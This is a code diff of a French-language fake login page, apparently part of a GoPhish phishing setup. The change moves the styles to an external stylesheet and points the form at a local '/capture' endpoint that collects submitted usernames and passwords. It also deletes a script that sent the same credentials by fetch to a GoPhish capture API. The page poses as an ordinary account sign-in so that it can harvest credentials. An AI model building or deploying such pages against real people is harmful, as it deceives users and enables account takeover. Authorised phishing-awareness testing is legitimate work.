@@ -4,101 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Se connecter à votre compte</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        
-        .container {
-            background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 300px;
-            text-align: center;
-        }
-        
-        h1 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            color: #333;
-        }
-        
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-            box-sizing: border-box;
-        }
-        
-        button {
-            width: 100%;
-            padding: 10px;
-            border-radius: 5px;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
-        
-        button:hover {
-            background-color: #45a049;
-        }
-        
-        a {
-            color: #4CAF50;
-            text-decoration: none;
-        }
-        
-        a:hover {
-            text-decoration: underline;
-        }
-
-    </style>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <h1>Se connecter à votre compte</h1>
-        <form action="http://localhost:3333" method="POST" id="login-form">
+        <form action="http://localhost:3333/capture" method="POST" id="login-form">
             <input type="text" id="username" name="username" placeholder="Adresse e-mail ou numéro de téléphone" required>
             <input type="password" id="password" name="password" placeholder="Mot de passe" required>
             <button type="submit">Se connecter</button>
         </form>
         <p><a href="#">Mot de passe oublié ?</a></p>
     </div>
-
-    <script>
-        // Ajouter un écouteur d'événements pour envoyer les données à GoPhish
-        document.getElementById('login-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-
-            // Envoi des données à GoPhish (remplacer par l'URL GoPhish pour capturer les données)
-            fetch('http://localhost:3333/api/capture', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    username: username,
-                    password: password,
-                }),
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Données envoyées à GoPhish:', data);
-            })
-            .catch(error => console.error('Erreur:', error));
-        });
-    </script>
 </body>
 </html>
